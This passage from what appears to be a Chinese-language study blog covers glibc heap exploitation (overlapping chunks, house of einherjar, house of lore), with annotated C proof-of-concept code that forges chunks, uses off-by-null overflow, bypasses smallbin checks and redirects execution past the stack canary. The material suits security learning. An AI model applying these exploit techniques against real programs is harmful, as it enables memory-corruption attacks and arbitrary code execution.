src="https://inews.gtimg.com/newsapp_ls/0/13516529148/0" alt="image-20210512124710639"></p><p>此时的b1已经被放到了原本b的位置，然后我们再malloc b2</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516537157/0" alt="image-20210512125019648"></p><p>随后我们释放b1和c，程序会直接无视b2合并b1和c</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516740491/0" alt="image-20210512135642809"></p><p>此时我们将合并后的chunk申请回来作为d，此时d就会和b2发生overlapping</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516749332/0" alt="image-20210512135925294"></p><p>然后我们给d赋值，b2就会被修改</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516753875/0" alt="image-20210512140042490"></p><h2 id="总结-10"><a href="#总结-10" class="headerlink" title="总结"></a>总结</h2><p>程序首先malloc了a(0x100),b(0x200),c(0x100),barrier(0x100)四个chunk</p><p>随后为了绕过check,程序将b+0x1f0的位置设为了0x200</p><p>紧接着程序Free掉了b并将b的size设为了0x200(原本是0x211)</p><p>随后程序malloc了b1(0x100),因为b是被Free掉的,因此b1就会被放到b的部分,而b做了一个unlink,一分两半</p><p>随后程序又malloc了b2(0x80),b2依旧是所属b的</p><p>之后程序为了方便看效果,将b2填满了’B’</p><p>最后程序free掉了b1和c,因为c的pre_size为0x210,因此程序就会将b1和c合并,因为b2位于b1和c之间,虽然b2其实并未被free,但是我们已经可以申请到b2的内存了</p><p>此时程序malloc了d(0x300),系统就会把b1和c合并后的大chunk给用户,此时d就申请到了原本b开始到b+0x310结束的内存,将b2包了起来</p><p>构成了overlapping,此时给d赋值为”D”,可以看到b2也被覆盖成了”D” :)</p><h1 id="0x11-house-of-einherjar"><a href="#0x11-house-of-einherjar" class="headerlink" title="0x11 house of einherjar"></a>0x11 house of einherjar</h1><p>这个技术是利用free的后向合并把top chunk设为我们伪造的chunk地址来强制malloc分配到我们伪造的地址，并且这个是在glibc2.23的版本测试使用，利用off-by-null</p><h2 id="源代码-11"><a href="#源代码-11" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a fake chunk</span></span><br><span class="line">    <span class="comment">// 我们可以在任意一个我们想要的地方来创建一个fake chunk，本例中我们将在栈上创建这个fake_chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 当然你也可以在heap或者bss段任意一个你知道地址的地方创建fake chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 我们将我们的fwd和bck指针指向fake_chunk来pass unlink的checks</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line">    <span class="comment">//尽管有的时候我们可以在这儿使用unsafe unlink技术</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">fake_chunk[<span class="number">2</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">fake_chunk[<span class="number">3</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">fake_chunk[<span class="number">4</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">fake_chunk[<span class="number">5</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment"> * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment"> * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"><span class="keyword">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;b&#x27;.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// 这个技术通过覆盖chunk的size以及pre_inuse位来工作</span></span><br><span class="line"><span class="comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">    <span class="comment">// 如果b的size是0x100的倍数，那么就很简单了，连size都不用改，直接修改他的pre_inuse位就好啦</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">   <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line"><span class="comment">// 如果已经被修改了，我们将在b内需要一个fake chunk，它将尝试合并下一个块</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span></span><br><span class="line">   <span class="string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write a fake prev_size to the end of a</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span></span><br><span class="line">   <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line"><span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>) - (<span class="keyword">uint8_t</span>*)fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">*(<span class="keyword">size_t</span>*)&amp;a[real_a_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改fake chunk的size去反应b的新的prev_size</span></span><br><span class="line"><span class="comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);</span><br><span class="line">fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free b，之后他就会和我们的fake chunk合并了</span></span><br><span class="line"><span class="comment">// free b and it will consolidate with our fake chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果我们在free b之前分配另一个chunk,我们需要做两件事</span></span><br><span class="line"><span class="comment">//if we allocate another chunk before we free b we will need to </span></span><br><span class="line"><span class="comment">//do two things: </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//1)我们将需要调整我们的fake chunk的size来使得fake_chunk+fake_chunk的size指针在我们所能控制的区域内</span></span><br><span class="line"><span class="comment">//1) We will need to adjust the size of our fake chunk so that</span></span><br><span class="line"><span class="comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//2)我们将需要在我们控制的地址写我们的fake chunk的size</span></span><br><span class="line"><span class="comment">//2) we will need to write the size of our fake chunk</span></span><br><span class="line"><span class="comment">//at the location we control. </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//在做了这两件事情之后，当unlink被调用的时候，我们的Fake chunk就将通过check</span></span><br><span class="line"><span class="comment">//After doing these two things, when unlink gets called, our fake chunk will</span></span><br><span class="line"><span class="comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//否则我们需要确定我们的fake chunk可以抵御荒野？？？(荒野这里有点迷离</span></span><br><span class="line"><span class="comment">//otherwise we need to make sure that our fake chunk is up against the</span></span><br><span class="line"><span class="comment">//wilderness</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们再调用malloc的时候，返回的时候就该是我们fake chunk的地址了</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-10"><a href="#运行结果及调试-10" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先是chunk a</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516955852/0" alt="image-20210512144837108"></p><p>然后给我们的fake_chunk赋值</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516959141/0" alt="image-20210512144928302"></p><p>然后malloc了b</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516978344/0" alt="image-20210512145418191"></p><p>然后我们将b的size的pre_inuse位置0</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13517001948/0" alt="image-20210512145944408"></p><p>此时设置我们的fake chunk的size和b的pre_size为b和fake chunk的差值</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13518881665/0" alt="image-20210512215635345"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13518881916/0" alt="image-20210512215642413"></p><p>现在我们free b，程序通过pre_size就会去找fake chunk，又发现fake chunk也是free态的，因此就会与我们的fake chunk合并，此时我们再次malloc的话</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13518886966/0" alt="image-20210512215843671"></p><h2 id="总结-11"><a href="#总结-11" class="headerlink" title="总结"></a>总结</h2><p>程序首先malloc了chunk a(0x38)</p><p>之后呢在栈上创建了fake chunk,并且伪造了fake chunk的结构</p><p>随后程序又malloc了chunk b(0xf8),b和top chunk相邻</p><p>我们计算量b和fake chunk的地址差后,将b的pre_size设为了我们的差值,并把b的pre_inuse置0,之后free掉了b</p><p>此时b就通过pre_size找到了我们的fake chunk并且与我们的fake chunk合并了,现在我们再申请一个chunk,就会从fake chunk那分配了</p><p>条件：</p><ol><li>被合并的chunk需要在free态，可以直接释放啥的，也可以伪造为free态(通过下一个chunk的pre_inuse位)</li><li>伪造合并的chunk的pre_size和被合并的chunk的size需要相同</li></ol><h1 id="0x12-house-of-lore"><a href="#0x12-house-of-lore" class="headerlink" title="0x12 house of lore"></a>0x12 house of lore</h1><p>这个方法利用small bin的机制而导致任意地址分配，利用下面的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[ ... ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="line"></span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> e·rrout;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">       set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">       bin-&gt;bk = bck;</span><br><span class="line">       bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">       [ ... ]</span><br></pre></td></tr></table></figure><p>我们需要做的就是将small bin的bk指针指向我们的fake chunk，也就是控制bck，但是要注意的是bck-&gt;fd!=victim这个地方需要绕过。</p><h2 id="源代码-12"><a href="#源代码-12" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 这个版本也可以绕过glibc malloc引入的强化检查</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 分配victim  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="comment">// 这是堆上的第一个samll chunk  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 我们需要去掉头部大小才能得到真正的victim地址  </span></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在栈上创建一个fake chunk  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 我们把fwd指针指向victim_chunk来绕过第二个malloc到最后一个malloc上small bin corrupted检查，这样就可以将我们的栈地址写到small bin list里了</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将我们的bk指针指向stack_buffer_2并且将stack_buffer_2的fwd指针指向stack_buffer_1来绕过最后一个malloc上small bin corrupted的检查，这样就可以在栈上返回一个假的chunk</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 分配另一个large bin来避免small bin在free的时候与top chunk合并  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// free顶块,此时会将它放进unsorted bin中  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在unsorted bin中,victim的fwd和bk指针都是0  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 现在调用一个不会被unsorted bin或者small bin处理的malloc  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 这也意味着chunk victim会被插入到smallbin的最前面  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line">  <span class="comment">// victim chunk已经被排序并且他的fwd和bk指针也被更新了</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">  <span class="comment">// 现在假设我们有一个漏洞可以覆盖victim-&gt;bk指针</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">  <span class="comment">// victim-&gt;bk正指向栈上</span></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="comment">// 现在我们分配一个和我们第一次free大小一样的chunk</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 这个操作将会给我们返回已经被覆写的victim chunk并且将bin-&gt;bk指向被注入的victim-&gt;bk指针  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这个最后一次的malloc将欺骗glibc malloc返回一个在bin-&gt;bk中被注入的chunk</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 而stack_buffer_2的fwd指针也在最后一次的malloc中被修改了</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-11"><a href="#运行结果及调试-11" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>现在malloc了victim和申请了两个变量</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13538704706/0" alt="image-20210518133327151"></p><p>然后修改了stack_buffer_1的值</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13538706340/0" alt="image-20210518133401242"></p><p>第二次修改</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13538707201/0" alt="image-20210518133423762"></p><p>现在分配p5来避免free victim的时候被合并到top chunk中</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13538708409/0" alt="image-20210518133449918"></p><p>接着我们free掉victim，它就会被放入fastbin中</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13538723461/0" 